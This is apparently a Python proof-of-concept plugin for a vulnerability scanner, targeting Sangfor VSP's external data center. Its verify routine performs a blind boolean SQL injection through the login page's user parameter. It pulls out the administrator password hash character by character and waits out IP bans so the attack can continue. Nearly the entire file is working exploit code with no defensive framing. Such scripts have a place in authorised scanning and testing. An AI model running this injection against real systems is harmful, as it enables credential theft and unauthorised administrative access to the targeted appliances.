# coding:utf-8
import sys
import time

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Sangfor_0101' # 平台漏洞编号
    name = 'Sangfor(深信服) VSP外置数据中心getshell' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''模版漏洞描述
    Sangfor(深信服) VSP外置数据中心getshell。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Sangfor(深信服)'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'd2bc9a92-b9c2-4447-8e80-8c477e000eac' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-08' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            password = ""
            url = self.target
            lists = ["a","b","c","d","e","f","0","1","2","3","4","5","6","7","8","9"]
            pointer = 0
            while pointer < 17 :
                flag = False
                index = 0
                while (index < len(lists)) :
                    sql = "and (select mid(sys_adt_pass,%d,1) from sys_adt where id=1)=\"%s\"" % (pointer+1,lists[index])
                    response = requests.get(url+"src/login.php?action_c=login&amp;user_type=1&amp;user=admin&amp;pass=&amp;nodeid=1 "+sql,timeout=10,verify=False)
                    if "拒绝登录" in response.content : #IP被封锁时，延迟305秒
                        self.output.info("login failure exceeded 5 times,ip is banned,wait for 305 seconds to continue")
                        time.sleep(305)
                    elif "用户名或者密码不正确" in response.content :
                        self.output.report(self.vuln, "password[%d]=%s" % (pointer,lists[index]))
                        password += lists[index]
                        break
                    elif "连接数据库失败" in response.content :
                        index += 1
                    else :
                        # 找不到漏洞
                        sys.exit(0)
                        
                pointer += 1
            print("Admin's password is %s") % (password)

            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
